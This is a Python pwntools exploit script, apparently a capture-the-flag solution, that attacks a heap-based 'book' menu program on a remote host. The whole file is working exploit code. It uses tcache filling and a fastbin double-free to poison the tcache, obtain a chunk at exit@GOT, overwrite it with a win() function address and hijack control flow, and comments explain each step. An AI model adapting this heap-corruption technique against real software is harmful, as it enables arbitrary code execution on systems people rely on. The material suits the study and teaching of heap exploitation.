from pwn import *

elf = ELF("./chall")
# io = process("./chall")
io = remote("152.118.201.241", 3024)

win_addr = 0x4007b7
exit_got = 0x602058

def add(idx, title, page):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"it?: ", str(idx).encode())
    io.sendlineafter(b"Title: ", title)
    io.sendlineafter(b"Page: ", str(page).encode())

def free(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"is the book?: ", str(idx).encode())

# 1. Allocate 9 chunks to prepare for fastbin/tcache manipulation
for i in range(9):
    add(i, b"A", 1)

# 2. Fill the tcache (7 chunks max)
for i in range(7):
    free(i)

# 3. The next frees go to the fastbin. 
# We can safely double-free here because fastbins don't check the 'key'.
free(7)
free(8)
free(7)

# 4. Empty the tcache so we can pull from the fastbin again
for i in range(7):
    add(i + 10, b"B", 1) 

# 5. This allocation looks at the empty tcache, then pulls chunk 7 from the fastbin.
# It then "stashes" the rest of the corrupted fastbin loop into the tcache.
# Because chunk 7 is simultaneously returned to us AND stashed in the tcache, 
# writing to it poisons the new tcache list.
add(17, p64(exit_got), 1)

# 6. Pop the remaining stashed chunks from the tcache
add(18, b"C", 1) # Gets chunk 8
add(19, b"D", 1) # Gets chunk 7

# 7. The next allocation returns our fake chunk at exit@GOT!
# Overwrite it with the address of win()
add(20, p64(win_addr), 1)

# 8. Trigger execution by calling exit()
io.sendlineafter(b"> ", b"4")

io.interactive()